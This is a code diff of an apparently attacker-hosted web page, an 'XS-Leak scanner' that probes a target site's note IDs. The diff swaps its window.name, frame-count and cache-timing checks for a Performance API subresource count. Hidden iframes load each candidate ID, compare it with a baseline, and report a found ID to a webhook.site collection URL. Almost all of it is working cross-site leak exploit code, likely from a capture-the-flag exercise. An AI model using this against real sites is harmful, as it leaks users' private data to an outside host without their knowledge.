@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced XS-Leak Scanner</title>
+    <title>Subresource XS-Leak Scanner</title>
 </head>
 <body>
     <h1>Scanning for notes...</h1>
@@ -11,13 +11,9 @@
         const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
         const START_ID = 1378;
         const END_ID = 2000;
-        const DELAY_MS = 500;            // delay between IDs (avoid rate limiting)
-        const BASELINE_ID = -1;            // non-existent ID for baseline
-        const CACHE_TIMEOUT = 100;         // timeout for cache probe (ms)
-        const POPUP_TIMEOUT = 2000;        // timeout for iframe load
-
-        let baseline = { name: null, frames: null, cacheTime: null, duration: null };
-        let scanning = true;
+        const DELAY_MS = 500;                // delay between IDs
+        const BASELINE_ID = -1;               // non-existent ID
+        const IFRAME_TIMEOUT = 2000;          // max wait for iframe to load
 
         function updateStatus(msg) {
             const div = document.getElementById('status');
@@ -25,152 +21,73 @@
             console.log(msg);
         }
 
-        // ---------- 1. Iframe: window.name and frame count ----------
-        function checkIframeProps(url) {
+        // Count subresources loaded from the same origin as the target
+        function countSubresources(origin, afterTimestamp) {
+            const entries = performance.getEntriesByType('resource');
+            let count = 0;
+            for (const entry of entries) {
+                if (entry.startTime > afterTimestamp && entry.name.startsWith(origin)) {
+                    count++;
+                }
+            }
+            return count;
+        }
+
+        // Measure subresource count for a given ID
+        async function measureSubresources(id) {
             return new Promise((resolve) => {
+                const url = TARGET_BASE + id;
+                const origin = new URL(url).origin;
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.src = url;
+
+                // Mark before load
+                const beforeTime = performance.now();
                 let resolved = false;
 
                 const timeout = setTimeout(() => {
                     if (!resolved) {
                         resolved = true;
                         document.body.removeChild(iframe);
-                        resolve({ name: null, frames: null });
+                        // Count subresources after timeout (maybe still loading)
+                        const count = countSubresources(origin, beforeTime);
+                        updateStatus(`ID ${id} (timeout): subresource count = ${count}`);
+                        resolve(count);
                     }
-                }, POPUP_TIMEOUT);
+                }, IFRAME_TIMEOUT);
 
                 iframe.onload = () => {
                     clearTimeout(timeout);
                     if (resolved) return;
                     resolved = true;
-                    let name = null, frames = null;
-                    try {
-                        // These are readable cross-origin
-                        name = iframe.contentWindow.name;
-                        frames = iframe.contentWindow.length;
-                    } catch (e) {
-                        // Should not happen, but just in case
-                    }
-                    document.body.removeChild(iframe);
-                    resolve({ name, frames });
+                    // Wait a bit for any subresources to start loading
+                    setTimeout(() => {
+                        const count = countSubresources(origin, beforeTime);
+                        updateStatus(`ID ${id}: subresource count = ${count}`);
+                        document.body.removeChild(iframe);
+                        resolve(count);
+                    }, 200);
                 };
                 document.body.appendChild(iframe);
             });
         }
 
-        // ---------- 2. Cache probing ----------
-        // Measures first and second request times. If second is much faster, the resource was cached.
-        async function checkCache(url) {
-            // First request
-            const start1 = performance.now();
-            await fetch(url, { mode: 'no-cors', credentials: 'include' });
-            const end1 = performance.now();
-            const firstDuration = end1 - start1;
-
-            // Wait a moment (ensure the first request is fully processed)
-            await new Promise(r => setTimeout(r, 100));
-
-            // Second request
-            const start2 = performance.now();
-            await fetch(url, { mode: 'no-cors', credentials: 'include' });
-            const end2 = performance.now();
-            const secondDuration = end2 - start2;
-
-            // If second is significantly faster, assume cached
-            return { firstDuration, secondDuration, cached: secondDuration < firstDuration * 0.5 };
-        }
-
-        // ---------- 3. Simple timing (fallback) ----------
-        async function measureDuration(url, samples = 3) {
-            let total = 0;
-            for (let i = 0; i < samples; i++) {
-                const start = performance.now();
-                await fetch(url, { mode: 'no-cors', credentials: 'include' });
-                total += (performance.now() - start);
-                await new Promise(r => setTimeout(r, 50));
-            }
-            return total / samples;
-        }
-
-        // ---------- Baseline measurement ----------
-        async function measureBaseline() {
+        // Measure baseline (non-existent ID)
+        async function getBaseline() {
             updateStatus(`Measuring baseline using ID ${BASELINE_ID}...`);
-            const baselineUrl = TARGET_BASE + BASELINE_ID;
-
-            // 1. window.name & frames
-            const { name, frames } = await checkIframeProps(baselineUrl);
-            updateStatus(`Baseline: name = "${name}", frames = ${frames}`);
-
-            // 2. Cache probe
-            const cacheResult = await checkCache(baselineUrl);
-            updateStatus(`Baseline cache: first ${cacheResult.firstDuration.toFixed(1)} ms, second ${cacheResult.secondDuration.toFixed(1)} ms, cached = ${cacheResult.cached}`);
-
-            // 3. Duration average
-            const avgDuration = await measureDuration(baselineUrl);
-            updateStatus(`Baseline duration: ${avgDuration.toFixed(1)} ms`);
-
-            return {
-                name: name,
-                frames: frames,
-                cacheTime: cacheResult.secondDuration, // we compare second request time later
-                cached: cacheResult.cached,
-                duration: avgDuration
-            };
+            // Clear existing performance entries
+            performance.clearResourceTimings();
+            const baselineCount = await measureSubresources(BASELINE_ID);
+            updateStatus(`Baseline subresource count = ${baselineCount}`);
+            return baselineCount;
         }
 
-        // ---------- Decide if candidate differs from baseline ----------
-        function isPositive(id, candidate, baseline) {
-            // If window.name is set and baseline name is null, that's a strong indicator
-            if (candidate.name !== null && candidate.name !== '' && baseline.name !== candidate.name) {
-                updateStatus(`  -> Positive: window.name differs (${candidate.name})`);
-                return true;
-            }
-            // If frame count differs
-            if (candidate.frames !== null && candidate.frames !== baseline.frames) {
-                updateStatus(`  -> Positive: frame count differs (${candidate.frames} vs ${baseline.frames})`);
-                return true;
-            }
-            // If the second request was cached and baseline wasn't cached (or vice versa)
-            if (candidate.cached !== baseline.cached) {
-                updateStatus(`  -> Positive: cache behavior differs (candidate cached=${candidate.cached})`);
-                return true;
-            }
-            // If second request time is significantly different (e.g., > 2x baseline)
-            if (candidate.cacheTime && baseline.cacheTime && candidate.cacheTime > baseline.cacheTime * 2) {
-                updateStatus(`  -> Positive: second request time ${candidate.cacheTime.toFixed(1)} ms > 2x baseline ${baseline.cacheTime.toFixed(1)} ms`);
-                return true;
-            }
-            // If duration is significantly different (only if baseline duration is reliable)
-            if (candidate.duration && baseline.duration && candidate.duration > baseline.duration * 1.5) {
-                updateStatus(`  -> Positive: duration ${candidate.duration.toFixed(1)} ms > 1.5x baseline ${baseline.duration.toFixed(1)} ms`);
-                return true;
-            }
-            return false;
-        }
-
-        // ---------- Check a single ID ----------
-        async function checkId(id, baseline) {
-            const url = TARGET_BASE + id;
-            updateStatus(`Checking ID ${id}...`);
-
-            // Get candidate properties
-            const { name, frames } = await checkIframeProps(url);
-            const cacheResult = await checkCache(url);
-            const duration = await measureDuration(url);
-
-            const candidate = {
-                name: name,
-                frames: frames,
-                cacheTime: cacheResult.secondDuration,
-                cached: cacheResult.cached,
-                duration: duration
-            };
-
-            updateStatus(`ID ${id}: name="${name}", frames=${frames}, cached=${cacheResult.cached}, duration=${duration.toFixed(1)} ms`);
-
-            return isPositive(id, candidate, baseline);
+        async function checkId(id, baselineCount) {
+            performance.clearResourceTimings();
+            const subCount = await measureSubresources(id);
+            // If subresource count is higher than baseline, it's a positive
+            return subCount > baselineCount;
         }
 
         function reportId(id) {
@@ -180,15 +97,13 @@
         }
 
         async function run() {
-            baseline = await measureBaseline();
+            const baseline = await getBaseline();
             updateStatus(`Starting scan from ${START_ID} to ${END_ID}...`);
             for (let id = START_ID; id <= END_ID; id++) {
-                if (!scanning) break;
                 const exists = await checkId(id, baseline);
                 if (exists) {
                     reportId(id);
-                    // If you want to stop after first found, keep the break; remove to continue
-                    break;
+                    break; // remove if you want to continue scanning
                 }
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
